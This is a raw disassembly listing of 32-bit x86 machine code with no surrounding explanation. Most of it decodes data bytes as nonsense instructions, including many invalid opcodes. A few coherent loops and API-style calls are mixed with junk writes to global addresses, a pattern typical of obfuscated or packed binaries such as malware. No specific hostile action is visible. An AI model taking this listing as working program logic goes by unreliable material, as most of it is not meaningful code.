  40484b:	fisttp QWORD PTR [esi+0x7f652044]
  404851:	pop    DWORD PTR ds:[edx]
  404854:	shl    DWORD PTR [esi-0x22baacfd],cl
  40485a:	mov    BYTE PTR [ecx],0xdb
  40485d:	pop    esp
  40485e:	rcl    DWORD PTR [ecx],1
  404860:	jns    0x404800
  404862:	mov    dh,0x43
  404864:	daa    
  404865:	add    eax,0x12216723
  40486a:	fstp   TBYTE PTR [esi]
  40486c:	dec    edi
  40486d:	loopne 0x40483c
  40486f:	xchg   esp,eax
  404870:	sbb    eax,DWORD PTR [edx-0x599b894d]
  404876:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  404878:	cmp    esp,DWORD PTR [ebp+0x4beb4e6d]
  40487e:	pop    ds
  40487f:	cwde   
  404880:	loope  0x4048c7
  404882:	outs   dx,BYTE PTR cs:[esi]
  404884:	inc    ecx
  404885:	jnp    0x4048ce
  404887:	jae    0x404834
  404889:	cmp    dl,BYTE PTR [ebp-0x1afad8a0]
  40488f:	cmc    
  404890:	mov    ah,0x31
  404892:	and    BYTE PTR [esi+0x43ac3c],bl
  404898:	jge    0x40483a
  40489a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40489b:	add    BYTE PTR [ecx+0x23],dh
  40489e:	add    eax,0xe420b5eb
  4048a3:	push   ss
  4048a4:	xchg   edi,eax
  4048a5:	push   ds
  4048a6:	xor    al,0xbc
  4048a8:	leave  
  4048a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048aa:	mov    edi,0x7c58831a
  4048af:	sub    eax,0x296ad6f0
  4048b4:	out    0x6e,eax
  4048b6:	and    eax,0xe6705e5e
  4048bb:	jmp    0x404873
  4048bd:	cmp    eax,0x1adac3e2
  4048c2:	sub    ebx,DWORD PTR [edx+0x46]
  4048c5:	imul   edx,ebx,0x964a42e5
  4048cb:	cmp    ch,BYTE PTR [edi]
  4048cd:	sbb    BYTE PTR [ebx+0x3937d858],bl
  4048d3:	sub    BYTE PTR [ecx-0x3],0x67
  4048d7:	pusha  
  4048d8:	arpl   WORD PTR [esi+0x590ad27a],si
  4048de:	jnp    0x40493f
  4048e0:	mov    al,ds:0xfd8c2b34
  4048e5:	mov    ds:0x302d796d,al
  4048ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048eb:	call   DWORD PTR [eax+eax*8+0x5]
  4048ef:	loop   0x4048d8
  4048f1:	push   ds
  4048f2:	push   0x3a5f0078
  4048f7:	push   ss
  4048f8:	out    0xb4,eax
  4048fa:	xchg   al,dl
  4048fc:	int    0x26
  4048fe:	add    al,0x32
  404900:	rcr    BYTE PTR [ebp-0x42],cl
  404903:	fmul   DWORD PTR [esi+0x429ade12]
  404909:	pusha  
  40490a:	dec    edi
  40490b:	ret    0xb131
  40490e:	mov    ebx,0xfae7e92e
  404913:	test   DWORD PTR [ecx+esi*2],ecx
  404916:	(bad)
  404919:	retf   
  40491a:	and    DWORD PTR [esi-0x15e5955f],eax
  404920:	neg    BYTE PTR [ebp+0x45c70f9c]
  404926:	(bad)  
  404928:	test   DWORD PTR [eax+edi*8-0x7e0bba75],ebx
  40492f:	sbb    eax,0x417e59
  404934:	push   ecx
  404935:	jle    0x404978
  404937:	add    BYTE PTR [ebx],dh
  404939:	mov    BYTE PTR [ecx+0x41abde2d],0x0
  404940:	mov    edx,0xe9004245
  404945:	je     0x404948
  404947:	add    BYTE PTR [eax],al
  404949:	fst    QWORD PTR [ebx]
  40494b:	cdq    
  40494c:	loope  0x4049a7
  40494e:	jns    0x4049a5
  404950:	and    eax,esi
  404952:	scas   al,BYTE PTR es:[edi]
  404953:	pop    ss
  404954:	rcl    DWORD PTR [bp+0x19],cl
  404958:	mov    edx,ds
  40495a:	jg     0x4049da
  40495c:	jle    0x404938
  40495e:	jg     0x4049de
  404960:	jle    0x404998
  404962:	or     DWORD PTR [ecx],esp
  404964:	cmp    eax,0xc230ad97
  404969:	push   edx
  40496a:	sar    DWORD PTR [edi-0x1bf95dc8],1
  404970:	xor    DWORD PTR [edi-0x2db825d6],esi
  404976:	push   edx
  404977:	lea    eax,[ebx+0x5c38999b]
  40497d:	mov    ds,ebx
  40497f:	add    eax,0x9e998311
  404984:	icebp  
  404985:	inc    esi
  404986:	lea    ebp,[esi+0x51cd6381]
  40498c:	loope  0x4049de
  40498e:	repz mov dh,0x88
  404991:	in     al,0x54
  404993:	mov    ch,0x6f
  404995:	out    dx,al
  404996:	xchg   DWORD PTR [bx-0x5e],esi
  40499a:	push   ds
  40499b:	dec    ebp
  40499c:	lods   al,BYTE PTR ds:[esi]
  40499d:	mov    ch,0xf7
  40499f:	cli    
  4049a0:	dec    ebp
  4049a1:	pop    edx
  4049a2:	pushf  
  4049a3:	pop    esp
  4049a4:	out    0x28,eax
  4049a6:	mov    ecx,0x4e0524a5
  4049ab:	mov    ebp,0xef8726fa
  4049b0:	mov    ebp,0x3b2b4bbe
  4049b5:	mov    ch,0x84
  4049b7:	call   FWORD PTR [ecx]
  4049b9:	leave  
  4049ba:	pop    ecx
  4049bb:	daa    
  4049bc:	je     0x404955
  4049be:	nop
  4049bf:	mov    ebp,0xbc2a05fb
  4049c4:	inc    BYTE PTR [ecx+0x634f65da]
  4049ca:	jp     0x40496e
  4049cc:	push   ebx
  4049cd:	lahf   
  4049ce:	xchg   esp,eax
  4049cf:	cs popa 
  4049d1:	in     al,0xee
  4049d3:	add    ecx,ecx
  4049d5:	(bad)  
  4049d6:	cmp    al,0xc8
  4049d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049d9:	pushf  
  4049da:	(bad)  
  4049db:	fwait
  4049dc:	adc    al,0x5c
  4049de:	clc    
  4049df:	(bad)  
  4049e0:	mov    bh,0x10
  4049e2:	sbb    ebx,DWORD PTR [edi]
  4049e4:	daa    
  4049e5:	xchg   esp,eax
  4049e6:	cli    
  4049e7:	ror    DWORD PTR [edi+0x1c6bfdc0],0x2d
  4049ee:	mov    esp,0xd890c856
  4049f3:	add    eax,0xe0a8b339
  4049f8:	sub    DWORD PTR [esi],eax
  4049fa:	dec    esp
  4049fb:	pop    ebx
  4049fc:	ret    0x2a51
  4049ff:	mov    WORD PTR [ebp+0x108628bc],?
  404a05:	lahf   
  404a06:	add    edx,DWORD PTR [esi]
  404a08:	sbb    eax,0x7bf18100
  404a0d:	pop    edx
  404a0e:	jmp    0xaab18caf
  404a13:	xchg   esp,eax
  404a14:	adc    DWORD PTR [eax],ecx
  404a16:	mov    ch,ah
  404a18:	mov    edi,0x79fe6b02
  404a1d:	imul   ebp,DWORD PTR [ebx+ebp*8+0xf],0xe5e16822
  404a25:	push   0xcedaee79
  404a2a:	out    0x38,al
  404a2c:	test   eax,0x9d663bf8
  404a31:	add    al,0xc1
  404a33:	xor    BYTE PTR [ecx-0x4004e64d],bl
  404a39:	aad    0x2b
  404a3b:	pop    esi
  404a3c:	or     DWORD PTR [ebp+ebp*1+0x6b],edi
  404a40:	mov    edx,0x91784c32
  404a45:	mov    ?,WORD PTR [ebx-0x2e]
  404a48:	enter  0x1f00,0x73
  404a4c:	pop    eax
  404a4d:	jmp    0x18e0337e
  404a52:	sub    al,0x6c
  404a54:	xor    al,0xd9
  404a56:	retf   0xd8d9
  404a59:	sbb    esp,eax
  404a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a5c:	sub    eax,0x71830a20
  404a61:	cmp    esp,DWORD PTR ds:0x82499af7
  404a67:	jg     0x404a25
  404a69:	pop    ss
  404a6a:	repz pop ds
  404a6c:	cmp    eax,0x1c646549
  404a71:	jle    0x404a27
  404a73:	or     bh,bl
  404a75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a76:	jns    0x404a09
  404a78:	ret    0xb42e
  404a7b:	mov    al,ds:0x2900dbde
  404a80:	or     esi,DWORD PTR [ebx+eax*2]
  404a83:	retf   
  404a84:	and    ebp,DWORD PTR [esi+ecx*4+0x6391ddc1]
  404a8b:	leave  
  404a8c:	push   esp
  404a8d:	aad    0xe8
  404a8f:	xor    BYTE PTR [ebx-0x2b],al
  404a92:	or     al,0x6a
  404a94:	mov    esi,0x376c40fb
  404a99:	adc    edi,DWORD PTR [ecx+0x4c]
  404a9c:	enter  0xcc78,0x95
  404aa0:	pop    ebx
  404aa1:	mov    ah,0x17
  404aa3:	sub    ah,BYTE PTR [ebx]
  404aa5:	fisttp QWORD PTR [esp+ebp*1-0x53be393b]
  404aac:	mov    edx,0xc9cacc1d
  404ab1:	ins    DWORD PTR es:[edi],dx
  404ab2:	in     al,0xda
  404ab4:	hlt    
  404ab5:	neg    BYTE PTR ds:0x924d091f
  404abb:	pop    eax
  404abc:	xchg   ebp,eax
  404abd:	add    eax,edi
  404abf:	mov    DWORD PTR [ebp-0x18],eax
  404ac2:	and    DWORD PTR ds:0x4245ba,0x0
  404acc:	jmp    0x404adc
  404ad1:	mov    eax,ds:0x4245ba
  404ad6:	inc    eax
  404ad7:	mov    ds:0x4245ba,eax
  404adc:	cmp    DWORD PTR ds:0x4245ba,0x1e
  404ae3:	jae    0x404b28
  404ae9:	cmp    DWORD PTR ds:0x4245ba,0x6
  404af0:	jne    0x404b01
  404af6:	push   0x41ae97
  404afb:	call   DWORD PTR ds:0x40d1c4
  404b01:	cmp    DWORD PTR ds:0x4245ba,0x5
  404b08:	jne    0x404b19
  404b0e:	mov    eax,ds:0x4245ba
  404b13:	inc    eax
  404b14:	mov    ds:0x4245ba,eax
  404b19:	jmp    0x404ad1
  404b1e:	sub    DWORD PTR ds:0x415111,0xc33
  404b28:	mov    DWORD PTR [ebp-0x1c],0xf89c853f
  404b2f:	mov    BYTE PTR [ebp-0x1],0x57
  404b33:	sub    DWORD PTR ds:0x417e59,edi
  404b39:	mov    eax,DWORD PTR [ebp-0xc]
  404b3c:	xor    eax,esi
  404b3e:	and    DWORD PTR ds:0x415115,0x5145
  404b48:	add    eax,edi
  404b4a:	mov    DWORD PTR [ebp-0x18],eax
  404b4d:	mov    eax,DWORD PTR [ebp-0x24]
  404b50:	xor    eax,esi
  404b52:	adc    DWORD PTR ds:0x41abde,0x3f71
  404b5c:	add    eax,edi
  404b5e:	and    DWORD PTR ds:0x4245be,0x352e
  404b68:	push   eax
  404b69:	dec    eax
  404b6a:	mov    eax,DWORD PTR [ebp-0x28]
  404b6d:	xor    eax,esi
  404b6f:	and    DWORD PTR ds:0x4245b2,0x41abce
  404b79:	add    eax,edi
  404b7b:	xor    DWORD PTR ds:0x41abda,0x41237c
  404b85:	push   eax
  404b86:	and    DWORD PTR ds:0x4245be,0x41abe2
  404b90:	mov    eax,DWORD PTR [ebp-0x1c]
  404b93:	jmp    0x404d0c
  404b98:	push   0xffffff9c
  404b9a:	mov    ds:0x7b617853,al
  404b9f:	xchg   ebp,eax
  404ba0:	push   ebx
  404ba1:	mov    DWORD PTR [ecx+0x3f],esp
  404ba4:	pop    eax
  404ba5:	imul   esi,DWORD PTR [ebp+0x7e7ca611],0x7e
  404bac:	fidivr DWORD PTR [edi+0x7e]
  404baf:	jle    0x404b91
  404bb1:	inc    esi
  404bb2:	push   0xffffff91
  404bb4:	(bad)  
  404bb5:	stc    
  404bb6:	into   
  404bb7:	push   esp
  404bb8:	cwde   
  404bb9:	rol    ah,0xf7
  404bbc:	scas   eax,DWORD PTR es:[edi]
  404bbd:	(bad)  
  404bbe:	ss jne 0x404c1c
  404bc1:	fs mov ch,0x3c
  404bc4:	sti    
  404bc5:	xchg   esi,eax
  404bc6:	add    al,0x52
  404bc8:	mov    eax,DWORD PTR ds:[edx]
  404bcb:	and    eax,0x73887b95
  404bd0:	mov    dl,0x86
  404bd2:	or     eax,0x645dc42d
  404bd7:	xchg   al,dh
  404bd9:	mov    ds:0xd2520cb,al
  404bde:	in     al,dx
  404bdf:	rol    DWORD PTR [esi+0x35e51833],0x59
  404be6:	test   BYTE PTR [ebx],ah
  404be8:	push   0x8c96a620
  404bed:	jl     0x404c64
  404bef:	int    0x2f
  404bf1:	add    eax,0x400b69ba
  404bf6:	mov    esp,0xac7674a5
  404bfb:	scas   eax,DWORD PTR es:[edi]
  404bfc:	push   esi
  404bfd:	push   ebx
  404bfe:	push   esi
  404bff:	jbe    0x404c44
  404c01:	loope  0x404bc2
  404c03:	dec    ecx
  404c04:	ror    BYTE PTR ds:0x53a8a0fc,0x36
  404c0b:	xor    eax,0xfb4a71e1
  404c10:	scas   al,BYTE PTR es:[edi]
  404c11:	js     0x404c08
  404c13:	popa   
  404c14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c15:	inc    edi
  404c16:	lds    ebx,FWORD PTR [ecx+0x4c]
  404c19:	push   esi
  404c1a:	out    dx,eax
  404c1b:	mov    ecx,0x12c7cf70
  404c20:	scas   al,BYTE PTR es:[edi]
  404c21:	push   eax
  404c22:	sahf   
  404c23:	in     al,dx
  404c24:	fmul   QWORD PTR [eax-0x4e]
  404c27:	(bad)  
  404c28:	in     eax,dx
  404c29:	outs   dx,BYTE PTR es:[esi]
  404c2b:	push   esi
  404c2c:	std    
  404c2d:	dec    ebp
  404c2e:	scas   al,BYTE PTR es:[edi]
  404c2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c30:	in     eax,dx
  404c31:	call   0x1ad74048
  404c36:	xchg   edi,eax
  404c37:	adc    DWORD PTR [esi+0x2a],edi
  404c3a:	xchg   edi,eax
  404c3b:	jae    0x404ca2
  404c3d:	(bad)  
  404c3f:	sbb    edx,edi
  404c41:	out    dx,al
  404c42:	mov    ebp,0xe83eec8c
  404c47:	adc    BYTE PTR [esi+0x53],dl
  404c4a:	sub    ebp,DWORD PTR [ebx-0x7bd62be0]
  404c50:	fdiv   DWORD PTR ds:0x30e8814c
  404c56:	mov    dl,0xa2
  404c58:	and    DWORD PTR [edx+0x48],ecx
  404c5b:	(bad)  
  404c5c:	sahf   
  404c5d:	xchg   BYTE PTR [edi-0x7725b377],al
  404c63:	lods   al,BYTE PTR ds:[esi]
  404c64:	push   cs
  404c65:	jp     0x404c65
  404c67:	inc    ecx
  404c68:	or     BYTE PTR [esi-0x149e2e7],al
  404c6e:	(bad)  [ebx-0x51]
  404c71:	aad    0x44
  404c73:	fsub   DWORD PTR [ebx]
  404c75:	dec    ecx
  404c76:	cdq    
  404c77:	fucompp 
  404c79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c7a:	sub    ebx,DWORD PTR [esi+edx*2-0x106b7de4]
  404c81:	push   esp
  404c82:	out    0xa9,eax
  404c84:	imul   ecx,eax,0x70
  404c87:	fst    DWORD PTR [edi]
  404c89:	fucom  st(0)
  404c8b:	inc    edx
  404c8c:	jge    0x404cc7
  404c8e:	sub    eax,0x160f9c9d
  404c93:	or     DWORD PTR [edi+ebp*1-0x299cd85a],ecx
  404c9a:	mov    ss,WORD PTR [ecx-0x16]
  404c9d:	out    dx,al
  404c9e:	sbb    eax,0x605f105d
  404ca3:	iret   
  404ca4:	test   cl,0xdb
  404ca7:	jecxz  0x404c8d
  404ca9:	and    DWORD PTR [esi+eiz*2-0x13],0xdf2e7de2
  404cb1:	ror    DWORD PTR ds:0x8a8d2a7,0x6e
  404cb8:	(bad)  
  404cba:	pop    ebp
  404cbb:	push   es
  404cbc:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  404cbe:	mov    al,ah
  404cc0:	push   cs
  404cc1:	ret    0xaa01
  404cc4:	clc    
  404cc5:	iret   
  404cc6:	pop    ebx
  404cc7:	sub    eax,0x8f2402be
  404ccc:	call   0x5efff6e9
  404cd1:	fwait
  404cd2:	push   edx
  404cd3:	adc    al,0x63
  404cd5:	sub    BYTE PTR [edx+0x0],bl
  404cd8:	and    BYTE PTR [edx+edx*2-0x10],bh
  404cdc:	mov    eax,ds:0xbaca187
  404ce1:	aad    0x69
  404ce3:	jge    0x404ccf
  404ce5:	jns    0x404d14
  404ce7:	dec    eax
  404ce8:	and    BYTE PTR [eax],dl
  404cea:	xor    al,0xe2
  404cec:	pop    edx
  404ced:	or     bh,cl
  404cef:	loopne 0x404d2f
  404cf1:	lock sbb ah,dl
  404cf4:	mov    ds:0x78637f6d,al
  404cf9:	mov    eax,ds:0x24bd275d
  404cfe:	(bad)  
  404cff:	dec    edx
  404d00:	sahf   
  404d01:	cmc    
  404d02:	mov    ebp,0xbb16684
  404d07:	cmp    dh,bh
  404d09:	fnstcw WORD PTR [edx-0x839cc2d]
  404d0f:	sbb    eax,0x415105
  404d14:	add    eax,edi
  404d16:	xor    DWORD PTR ds:0x412364,0x39b1
  404d20:	push   eax
  404d21:	lea    eax,[ebp-0x78]
  404d24:	push   eax
  404d25:	mov    DWORD PTR ds:0x41237c,0x6752
  404d2f:	push   DWORD PTR [ebp-0xc]
  404d32:	sub    DWORD PTR ds:0x415111,0x1b2b
  404d3c:	push   DWORD PTR [ebp-0x14]
  404d3f:	sub    DWORD PTR ds:0x4245b6,0x412364
  404d49:	call   0x409363
  404d4e:	inc    DWORD PTR ds:0x415119
  404d54:	test   eax,eax
  404d56:	mov    DWORD PTR ds:0x4245b6,0x71ec
  404d60:	je     0x404de0
  404d66:	sub    DWORD PTR ds:0x417e59,0x4245ca
  404d70:	lea    eax,[ebp-0x78]
  404d73:	neg    DWORD PTR ds:0x4245be
  404d79:	push   eax
  404d7a:	add    eax,DWORD PTR ds:0x4245ca
  404d80:	mov    eax,DWORD PTR [ebp-0x14]
  404d83:	and    DWORD PTR ds:0x417e59,0xd95
  404d8d:	xor    eax,esi
  404d8f:	add    eax,edi
  404d91:	and    DWORD PTR ds:0x417e3d,0x71b6
  404d9b:	push   eax
  404d9c:	mov    eax,DWORD PTR [ebp-0x10]
  404d9f:	add    eax,0xaa
  404da4:	push   eax
  404da5:	and    DWORD PTR ds:0x41abd2,0x17f4
  404daf:	mov    eax,DWORD PTR [ebp-0x10]
  404db2:	sub    DWORD PTR ds:0x417e55,0x41236c
  404dbc:	mov    eax,DWORD PTR [eax+0x198]
  404dc2:	push   DWORD PTR [eax]
  404dc4:	add    DWORD PTR ds:0x417e55,0x417e3d
  404dce:	call   0x40ae4d
  404dd3:	mov    DWORD PTR ds:0x41abd6,0x35a
  404ddd:	mov    DWORD PTR [ebp-0x8],eax
  404de0:	mov    DWORD PTR ds:0x412368,0x764e
  404dea:	cmp    DWORD PTR [ebp-0x8],0x0
  404dee:	not    DWORD PTR ds:0x412364
  404df4:	lea    eax,[ebp+0x4]
  404df7:	mov    DWORD PTR [ebp-0x20],eax
  404dfa:	je     0x405842
  404e00:	lea    eax,[ebp-0x18]
  404e03:	jmp    0x404f7c
  404e08:	ja     0x404d8f
  404e0a:	(bad)  
  404e0b:	je     0x404d9a
  404e0d:	je     0x404d94
  404e0f:	test   DWORD PTR [esi],edi
  404e11:	push   ebx
  404e12:	outs   dx,DWORD PTR ds:[esi]
  404e13:	jne    0x404df6
  404e15:	mov    dh,0xdb
  404e17:	sub    eax,DWORD PTR [edx]
  404e19:	jb     0x404e99
  404e1b:	jle    0x404df7
  404e1d:	jg     0x404e9d
  404e1f:	jle    0x404da9
  404e21:	scas   eax,DWORD PTR es:[edi]
  404e22:	loop   0x404e9d
  404e24:	jmp    0x4a4c7c4e
  404e29:	mov    ecx,0xb96ddc38
  404e2e:	sub    dh,cl
  404e30:	icebp  
  404e31:	call   0x30b582e2
  404e36:	or     ch,al
  404e38:	dec    ebp
  404e39:	pushf  
  404e3a:	ret    
  404e3b:	jl     0x404dd4
  404e3d:	jl     0x404ded
  404e3f:	(bad)  
  404e40:	repz imul eax,DWORD PTR es:[edx-0x41],0x42
  404e46:	push   0x574c3fed
  404e4b:	dec    esi
  404e4c:	bswap  esp
  404e4e:	cdq    
  404e4f:	sub    eax,0xee13210d
  404e54:	neg    DWORD PTR [edi+0x5b]
  404e57:	lods   al,BYTE PTR ds:[esi]
  404e58:	cs jle 0x404ec8
  404e5b:	sbb    al,0xcd
  404e5d:	mov    esi,DWORD PTR [ecx+0x6f08d986]
  404e63:	adc    DWORD PTR [ebp+0x4],ecx
  404e66:	jge    0x404e89
  404e68:	push   esp
  404e69:	xor    eax,0x4d02877e
  404e6e:	dec    ecx
  404e6f:	jnp    0x404e53
  404e71:	sub    BYTE PTR [esi],ah
  404e73:	sub    DWORD PTR [esi],esp
  404e75:	imul   edi,DWORD PTR [edx-0x1a30bba4],0xffffffc8
  404e7c:	jae    0x404e08
  404e7e:	mov    dl,0xeb
  404e80:	test   dl,bh
  404e82:	and    BYTE PTR [ebx],bl
  404e84:	or     eax,0x39f79ef2
  404e89:	call   0x5aaac98b
  404e8e:	arpl   WORD PTR [esi+0x3d],dx
  404e91:	sub    eax,esp
  404e93:	cwde   
  404e94:	icebp  
  404e95:	sub    eax,0xfe3ee697
  404e9a:	push   esi
  404e9b:	lea    edi,[ebx]
  404e9d:	mov    bh,0xf2
  404e9f:	cdq    
  404ea0:	cmc    
  404ea1:	cwde   
  404ea2:	or     bl,ch
  404ea4:	in     al,0x5c
  404ea6:	idiv   BYTE PTR [esi-0x4b]
  404ea9:	mov    edi,0x6a1259e0
  404eae:	shr    BYTE PTR [esp+edi*4],1
  404eb1:	aam    0xea
  404eb3:	xchg   esi,eax
  404eb4:	dec    edx
  404eb5:	cmp    DWORD PTR [ebp+0x20],edi
  404eb8:	das    
  404eb9:	lock cmp DWORD PTR [ebx+0x1ca3aedb],edx
  404ec0:	es repz jg 0x404ed7
  404ec4:	or     al,0x9b
  404ec6:	mov    esi,0x45a24d9f
  404ecb:	je     0x404e53
  404ecd:	xchg   edx,eax
  404ece:	imul   dl
  404ed0:	mov    eax,0xb603a1fe
  404ed5:	and    BYTE PTR [edi],dh
  404ed7:	test   eax,0xe571168b
  404edc:	(bad)  
  404edd:	out    0x23,eax
  404edf:	dec    ebx
  404ee0:	in     eax,0x1f
  404ee2:	jae    0x404ebf
  404ee4:	(bad)  
  404ee7:	fadd   st,st(0)
  404ee9:	loope  0x404ec5
  404eeb:	add    al,0xb0
  404eed:	rcl    BYTE PTR [ecx+0x2d1778ba],0xc4
  404ef4:	mov    cl,0xfb
  404ef6:	cmp    eax,0xe16e15a6
  404efb:	ins    BYTE PTR es:[edi],dx
  404efc:	jnp    0x404f59
  404efe:	mov    BYTE PTR [ebx+0x3c],cl
  404f01:	aas    
  404f02:	call   FWORD PTR [edi-0x7f]
  404f05:	mov    esp,0xc29d3c91
  404f0a:	jb     0x404ea0
  404f0c:	inc    ebx
  404f0d:	cli    
  404f0e:	jno    0x404eac
  404f10:	push   ebp
  404f11:	mov    bh,0x4b
  404f13:	mov    dl,0x2c
  404f15:	xchg   DWORD PTR [ecx-0x431f6001],ecx
  404f1b:	push   edi
  404f1c:	xchg   ebx,eax
  404f1d:	mov    edx,0x2a082696
  404f22:	add    BYTE PTR [ebx+0x2febcd65],0xe1
  404f29:	test   eax,0x2a290dbd
  404f2e:	mov    ch,0x88
  404f30:	mov    edx,0x1c265364
  404f35:	xor    DWORD PTR [eax],ebp
  404f37:	pop    ds
  404f38:	cdq    
  404f39:	add    DWORD PTR [esi-0x284f7a8a],edx
  404f3f:	lock sbb eax,ecx
  404f42:	jmp    0x404f78
  404f44:	cmp    al,0x27
  404f46:	cli    
  404f47:	push   ebx
  404f48:	xchg   edi,eax
  404f49:	inc    edi
  404f4a:	jns    0x404f78
  404f4c:	sbb    DWORD PTR [esi+0x22c3868c],0x6a
  404f53:	out    0xc,eax
  404f55:	sbb    eax,0x983fe6c6
  404f5a:	jmp    0x4a82ef0b
  404f5f:	xchg   esp,eax
  404f60:	jmp    0x6438:0xbd2414
  404f67:	or     bh,BYTE PTR [edi+ebx*4-0x38]
  404f6b:	out    0x60,al
  404f6d:	shr    DWORD PTR [eax-0x74],1
  404f70:	shr    al,1
  404f72:	inc    ebp
  404f73:	pusha  
  404f74:	pop    ss
  404f75:	add    DWORD PTR [edx+0x3d3b85ea],ecx
  404f7b:	out    0x50,al
  404f7d:	and    DWORD PTR ds:0x4245ae,0x0
  404f87:	jmp    0x404f97
  404f8c:	mov    eax,ds:0x4245ae
  404f91:	inc    eax
  404f92:	mov    ds:0x4245ae,eax
  404f97:	cmp    DWORD PTR ds:0x4245ae,0x1e
  404f9e:	jae    0x404fc0
  404fa4:	cmp    DWORD PTR ds:0x4245ae,0x22
  404fab:	jne    0x404fba
  404fb1:	push   DWORD PTR [ebp-0x28]
  404fb4:	call   DWORD PTR ds:0x40d298
  404fba:	jmp    0x404f8c
  404fbf:	inc    eax
  404fc0:	mov    eax,DWORD PTR [ebp-0x2c]
  404fc3:	adc    DWORD PTR ds:0x412354,0x412370
  404fcd:	xor    eax,esi
  404fcf:	add    eax,edi
  404fd1:	and    DWORD PTR ds:0x415115,0x3c83
  404fdb:	jmp    0x405154
  404fe0:	adc    al,0x10
  404fe2:	imul   DWORD PTR [edx]
  404fe4:	mov    ebp,DWORD PTR [ecx+0x1f8510a9]
  404fea:	and    DWORD PTR [edx-0x57c27643],esi
  404ff0:	out    dx,al
  404ff1:	jae    0x405071
  404ff3:	jle    0x404fcf
  404ff5:	jg     0x405075
  404ff7:	jle    0x404f80
  404ff9:	(bad)  
  404ffa:	pop    ecx
  404ffb:	(bad)  
  404ffd:	mov    ds,WORD PTR [edx-0x66]
  405000:	inc    esi
  405001:	inc    ebp
  405002:	ret    0x7ee2
  405005:	and    DWORD PTR [esi+eax*1+0x16],ecx
  405009:	or     ebx,DWORD PTR [ebp-0x44]
  40500c:	(bad)  
  40500d:	dec    esp
  40500e:	inc    edx
  40500f:	cmp    al,0xf2
  405012:	das    
  405013:	mov    eax,0xd1e95bf
  405018:	dec    ecx
  405019:	mov    esi,0x22a8f263
  40501e:	loop   0x405084
  405020:	fnsave [ebx+0x4c7cf3fe]
  405026:	mov    ecx,0xed231146
  40502b:	in     eax,0x9b
  40502d:	dec    ebp
  40502e:	int    0xba
  405030:	ins    BYTE PTR es:[edi],dx
  405031:	(bad)  
  405032:	test   al,0x3f
  405034:	(bad)  
  405035:	pushf  
  405036:	fild   QWORD PTR [eax+ebp*8]
  405039:	shl    DWORD PTR [ecx+0x317c4ccb],cl
  40503f:	test   DWORD PTR [edi+ebp*8+0x37],edi
  405043:	adc    BYTE PTR [eax+0x7b],dh
  405046:	add    bl,BYTE PTR [edx]
  405048:	repz fbld TBYTE PTR [ebp-0x79]
  40504c:	xchg   ebx,eax
  40504d:	or     DWORD PTR [ecx+eiz*8-0x6b],edx
  405051:	lahf   
  405052:	jo     0x40501f
  405054:	pop    edx
  405055:	adc    ah,BYTE PTR [edx+0x37]
  405058:	sub    cl,BYTE PTR [eax+0x9]
  40505b:	xchg   BYTE PTR ds:0xd05dbf46,dh
  405061:	push   0xffffffea
  405063:	dec    esi
  405065:	jbe    0x404ff1
  405067:	dec    edx
  405068:	sti    
  405069:	sbb    esi,DWORD PTR [ecx]
  40506b:	ins    DWORD PTR es:[edi],dx
  40506c:	push   0x3f
  40506e:	xor    ebp,ebp
  405070:	ret    0xb0c9
  405073:	add    edi,esp
  405075:	mov    ds:0xcd901ad6,eax
  40507a:	inc    ebp
  40507b:	mov    bh,0x7c
  40507d:	jno    0x4050af
  40507f:	sub    ebp,DWORD PTR [ecx]
  405081:	mov    ecx,0xb508ef05
  405086:	div    DWORD PTR [esp+0x31ad85b1]
  40508d:	cmp    eax,0x2e2b08b0
  405092:	mov    dh,0x29
  405094:	xchg   BYTE PTR [edi],ah
  405096:	mov    edx,0x1887b613
  40509b:	jmp    0x96c7:0x8221c251
  4050a2:	dec    ebp
  4050a3:	repnz sub esi,DWORD PTR [ebx]
  4050a6:	dec    ebp
  4050a7:	fucomp st(6)
  4050a9:	and    edx,DWORD PTR [ecx+0x29]
  4050ac:	(bad)  
  4050ad:	rcl    DWORD PTR [esi+ebx*2-0x2798588b],cl
  4050b4:	inc    ecx
  4050b5:	jmp    0x30dc:0xcdc36117
  4050bc:	dec    esi
  4050bd:	daa    
  4050be:	mov    al,ds:0x43866313
  4050c3:	outs   dx,BYTE PTR ds:[esi]
  4050c4:	cld    
  4050c5:	(bad)  
  4050c6:	outs   dx,BYTE PTR ds:[esi]
  4050c7:	sub    al,0xe1
  4050c9:	or     al,0xc2
  4050cb:	mov    cl,0x98
  4050cd:	shl    BYTE PTR [edx+ecx*4+0x3e],cl
  4050d1:	cmp    DWORD PTR [edx-0x67],ecx
  4050d4:	ffreep st(3)
  4050d6:	(bad)  
  4050d7:	shl    BYTE PTR [ecx+edi*1-0x1753baae],1
  4050de:	and    eax,ebp
  4050e0:	push   esp
  4050e1:	or     al,0x84
  4050e3:	adc    BYTE PTR [esi],ah
  4050e5:	int3   
  4050e6:	add    DWORD PTR [ecx+0x1067576d],esp
  4050ec:	xor    BYTE PTR [ebp-0x4da413ea],al
  4050f2:	test   eax,0x37890b86
  4050f7:	push   edx
  4050f8:	xchg   ebx,eax
  4050f9:	fucomp st(0)
  4050fb:	in     al,0x26
  4050fd:	mov    bh,0xcd
  4050ff:	mov    dh,BYTE PTR [esi+0x5b]
  405102:	lods   al,BYTE PTR ds:[esi]
  405103:	push   edi
  405104:	into   
  405105:	jecxz  0x40515f
  405107:	mov    bh,0x51
  405109:	enter  0x864b,0x18
  40510d:	cli    
  40510e:	and    al,0x5
  405110:	pop    ds
  405111:	stos   BYTE PTR es:[edi],al
  405112:	jns    0x4050ad
  405114:	xlat   BYTE PTR ds:[ebx]
  405115:	jno    0x405134
  405117:	sahf   
  405118:	lods   al,BYTE PTR ds:[esi]
  405119:	jbe    0x40510f
  40511b:	jge    0x405183
  40511d:	and    ax,WORD PTR [esi+edi*2]
  405121:	ins    DWORD PTR es:[edi],dx
  405122:	in     eax,dx
  405123:	jmp    0x9689:0x59a4a3a3
